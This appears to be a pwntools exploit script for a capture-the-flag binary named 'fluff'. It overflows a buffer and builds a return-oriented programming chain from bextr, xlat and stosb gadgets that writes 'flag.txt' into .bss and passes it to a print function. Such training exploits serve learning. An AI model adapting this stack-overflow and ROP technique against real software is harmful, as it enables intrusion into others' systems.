from pwn import *

def start():
        global chall
        if args.REMOTE:
                chall = remote('localhost', 1337)
        else:
                chall = elf.process()

context.binary = elf = ELF('./fluff')
# libc = elf.libc
start()

pop_rdi = p64(0x00000000004006a3)       # : pop rdi ; ret
xlat_addr = p64(0x400628)               # : xlat ; ret
bextr_addr = p64(0x00000000040062A)     
# pop rdx
# pop rcx 
# add rcx, 3ef2h
# bextr rbx, rcx, rdx
# ret

# al = [rbx + al] => rbx + al = flag[x] => rbx = flag[x] - al 
# => len(rbx) = 8 bit upper of rdx; rcx = rbx - 0x3ef2   
stosb_addr = p64(0x400639)              # stosb; ret
bss_addr = 0x601038

flag_addr = [0x4003C4,0x4003C5,0x4003D6,0x4003CF,0x4003C9,0x4003D8,0x4006C8,0x4003D8]
al = bytearray(b'\x0bflag.tx')
print_addr = p64(0x400510)
payload = b'a'  * 40
for i in range(8):
        # extract the flag character
        payload += bextr_addr
        rbx = flag_addr[i] - al[i]
        rcx = rbx - 0x3ef2
        rdx = (len(bin(rbx)[2:]) << 8)
        payload += p64(rdx)
        payload += p64(rcx)
        # put the current character to bss
        payload += xlat_addr
        payload += pop_rdi
        payload += p64(bss_addr + i)
        payload += stosb_addr
payload += pop_rdi
payload += p64(bss_addr)
payload += print_addr

with open('payload.txt', 'wb') as f:
    f.write(payload + b'\n')
    

chall.recvuntil(b'> ')
chall.sendline(payload)
p = chall.recvall(timeout = 0.2)
print(p)